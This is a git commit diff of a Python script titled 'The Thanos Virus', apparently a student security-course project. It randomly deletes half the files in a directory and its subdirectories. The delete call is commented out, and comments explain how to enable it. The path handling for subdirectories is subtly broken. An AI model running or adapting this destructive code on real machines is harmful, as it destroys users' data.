f01228985b82a75b5ee2b940d59cc7ef20c57dcc
JKippy <kaipjason@gmail.com>
2020-10-29 13:45:20 -0400

    Updated script to run through all subdirectories. Also added documentation.

--- thanos.py
+++ thanos.py
@@ -1,17 +1,49 @@
 #!/usr/bin/python
+
+#Title:  The Thanos Virus
+#Author: Jason Kaip
+#CIS 458(01)
+
+#Description: This program deletes half of the files in the directory it is ran in and
+#then in each subdirectory.
+
+#Disclaimer: I do not take responsibility for any damages caused by this program. This was
+#made for strictly educational purposes. Use with caution.
+
+#Important: The statement that deletes the files is commented out at first for safety.
+#Uncomment the statement if you wish to run the full program- otherwise, the program will
+#only print out what files it would have deleted.
+
 import os, random
 
-files = len([name for name in os.listdir('.') if os.path.isfile(name) or os.path.isdir(name)])
-names = [name for name in os.listdir('.') if os.path.isfile(name) or os.path.isdir(name)]
+#Subdirectory names are put into an array.
+directnames = [name for name in os.listdir('.') if os.path.isdir(name)]
+direct = len(directnames)
 
-print names
+#This method performs a Thanos snap (deletes half of the files) in the directory specified.
+def snapFiles(directory):
+	#File names are put into an array.
+	filenames = [name for name in os.listdir(directory) if os.path.isfile(name)]
+	files = len(filenames)
 
-half = files/2
-while half > 0:
-	ran = random.randint(0,files-1)
-	if names[ran] != "thanos.py" and names[ran] != "thanosvid.mp4":
-		if os.path.exists(names[ran]):
-			print "Removing: " + names[ran]
-			#os.remove(names[ran])
-			half = half-1
-print "Stopped"
+	#While loop deletes one file at a time until half remain.
+	half = files/2
+	while half > 0:
+		#Randomly chooses file
+		ran = random.randint(0,files-1)
+		#If statement prevents Thanos from deleting itself
+		if filenames[ran] != "thanos.py":
+			if os.path.exists(filenames[ran]):
+				print "Removing: " + filenames[ran]
+				
+				#Uncomment the line below if you wish to delete your files
+				#os.remove(filenames[ran])
+				
+				half = half-1
+	print "Removed half of files from folder: " + directory
+
+#Thanos snap is performed on main directory and then subdirectories
+snapFiles('.')
+for d in directnames:
+	if d != ".git":
+		snapFiles(d)
